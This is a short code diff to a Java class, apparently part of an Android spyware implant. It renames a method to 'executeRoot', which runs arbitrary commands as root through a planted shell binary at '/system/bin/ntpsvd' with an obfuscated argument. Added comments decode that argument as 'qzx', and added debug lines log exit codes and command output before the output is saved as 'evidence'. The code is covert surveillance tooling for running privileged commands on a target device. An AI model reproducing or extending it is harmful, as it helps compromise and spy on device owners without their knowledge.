@@ -92,18 +92,29 @@ public class ExecuteAction extends SubActionSlow {
 			Check.log(TAG + " (execute): " + command);
 		}
 		ExecuteResult ret = Execute.execute(this.command);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (execute) exitCode: " + ret.exitCode);
+			Check.log(TAG + " (execute) stdout: " + ret.getStdout());
+		}
+		
 		ret.saveEvidence();
 		
 		return ret.exitCode == 0;
 	}
 
-	public static boolean execute(String command) {
+	public static boolean executeRoot(String command) {
 		// Proviamo ad eseguire il comando da root
 		try {
+			//a_0=/system/bin/ntpsvd
+			// 35_0=qzx
 			String cmd = String.format("%s %s %s", Configuration.shellFile, Messages.getString("35_0"), command ); // EXPORT
 			ExecuteResult ret = Execute.execute(cmd);
 			
-			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (executeRoot) exitCode: " + ret.exitCode);
+				Check.log(TAG + " (executeRoot) stdout: " + ret.getStdout());
+			}
+						
 			return true;
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
